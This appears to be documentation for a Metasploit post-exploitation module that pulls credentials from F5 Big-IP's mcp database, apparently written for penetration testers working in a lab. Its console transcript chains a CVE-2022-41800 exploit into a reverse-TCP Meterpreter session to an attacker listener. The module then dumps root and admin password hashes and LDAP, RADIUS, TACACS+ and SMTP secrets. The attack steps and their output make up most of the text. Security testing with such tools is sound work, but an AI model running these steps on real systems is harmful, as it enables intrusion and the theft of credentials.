## Vulnerable Application

The application is F5 Big-IP, and I don't think the versions matters but I
tested on version 17.0.0.1. It can be downloaded as a VMWare image for free
(you have to create an account) from https://downloads.f5.com. You can register
for a free 30-day trial if you like, but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

1. Install the application
2. Start `msfconsole`
3. Do: Get any session somehow (`exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800` works well on 17.0.0.1 and earlier, or just use `msfvenom` w/ a Linux payload)
4. Do: `use post/linux/gather/f5_loot_mcp`
5. Do `set SESSION <sessionid>`
6. Do: `run`
7. You should get the info

## Options

### GATHER_HASHES

If `true`, read a list of local users and passwords (`userdb_entry` values) from mcp.

Default: true

### GATHER_SERVICE_PASSWORDS

If `true`, read upstream service passwords (active directory, LDAP, etc) from different parts of mcp.

Default: true

### GATHER_DB_VARIABLES

If `true`, read configuration information from mcp (note that this is slow).

Default: false (due to the speed)

## Scenarios

### F5 Big-IP 17.0.0.1 with a root session

First, get a non-root session however you can. I used the rpmspec vuln:

```
msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
HttpPassword => iagotestbigip
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
RHOST => 10.0.0.162
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/config/rest/node/tmp/708677fa-5b30-43e6-9ce3-d84046e9f6e9.spec
[+] Deleted /var/config/rest/node/tmp/RPMS/noarch/yE15kZeAwp-1.6.1-7.4.4.noarch.rpm
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:36124) at 2022-11-14 16:12:04 -0800

meterpreter > bg
```

Then just use the module, set the SESSION, and run it:

```
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_loot_mcp
msf6 post(linux/gather/f5_loot_mcp) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/f5_loot_mcp) > set VERBOSE true
VERBOSE => true
msf6 post(linux/gather/f5_loot_mcp) > show options

Module options (post/linux/gather/f5_loot_mcp):

   Name                       Current Setting  Required  Description
   ----                       ---------------  --------  -----------
   GATHER_DB_VARIABLES        false            yes       Gather database variables (warning: slow)
   GATHER_HASHES              true             yes       Gather password hashes from mcp
   GATHER_UPSTREAM_PASSWORDS  true             yes       Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from mcp
   SESSION                    1                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/f5_loot_mcp) > run

[*] Gathering users and password hashes from MCP
[+] admin:$6$Rvvp3001$4fGV5Pb2gf9rbiV78KCbdbGhfdwsFL0Kt1BR3IIytgb.2aXCpJG0xC2.JDzRvpAjTbIrvBt7YHi2j0mh.ww9i1
[+] f5hubblelcdadmin:yJXc4uXccfpSrdxcvZIjYT7clhNMUPJG
[+] root:$6$leOcJhIk$pY9xDy1lvacvJzIYM0RCgJ3laTppP2jFjsNek1AbFddYQWEuFMek51K5cyg5BU3pYMhTGQoWgDr0gocIIyMoc1
[*] Gathering upstream passwords from MCP
[*] Trying to fetch LDAP / Active Directory configuration
[+] dc.msflab.local:636   - ldaps: 'smcintyre:Password1!'
[*] Trying to fetch Radius configuration
[+] 192.168.159.12:1812   - radius: ':radiussecret'
[+] 192.168.159.13:1812   - radius: ':radiusbackup'
[*] Trying to fetch TACACS+ configuration
[+] 192.168.159.200:49    - tacacs+: ':tacaspassword'
[*] Trying to fetch SMTP configuration
[+] 192.168.159.128:25    - smtp: 'alice:secretpassword'
[*] Post module execution completed
```

The module logs information to the Metasploit database (when connected):

```
msf6 post(linux/gather/f5_loot_mcp) > creds
Credentials
===========

host             origin           service            public            private                                                                                              realm  private_type        JtR Format
----             ------           -------            ------            -------                                                                                              -----  ------------        ----------
                 192.168.159.119                     smcintyre         Password1!                                                                                                  Password            
                 192.168.159.119                     admin             $6$Rvvp3001$4fGV5Pb2gf9rbiV78KCbdbGhfdwsFL0Kt1BR3IIytgb.2aXCpJG0xC2.JDzRvpAjTbIrvBt7YHi (TRUNCATED)         Nonreplayable hash  sha512,crypt
                 192.168.159.119                     f5hubblelcdadmin  yJXc4uXccfpSrdxcvZIjYT7clhNMUPJG                                                                            Nonreplayable hash  
                 192.168.159.119                     root              $6$leOcJhIk$pY9xDy1lvacvJzIYM0RCgJ3laTppP2jFjsNek1AbFddYQWEuFMek51K5cyg5BU3pYMhTGQoWgDr (TRUNCATED)         Nonreplayable hash  sha512,crypt
192.168.159.12   192.168.159.119  1812/tcp (radius)                    radiussecret                                                                                                Password            
192.168.159.13   192.168.159.119  1812/tcp (radius)                    radiusbackup                                                                                                Password            
192.168.159.128  192.168.159.119  25/tcp (smtp)      alice             secretpassword                                                                                              Password            
192.168.159.200  192.168.159.119  49/tcp (tacacs+)                     tacaspassword                                                                                               Password            

msf6 post(linux/gather/f5_loot_mcp) > services
Services
========

host             port  proto  name     state  info
----             ----  -----  ----     -----  ----
192.168.159.12   1812  tcp    radius   open
192.168.159.13   1812  tcp    radius   open
192.168.159.128  25    tcp    smtp     open
192.168.159.200  49    tcp    tacacs+  open

msf6 post(linux/gather/f5_loot_mcp) >
```
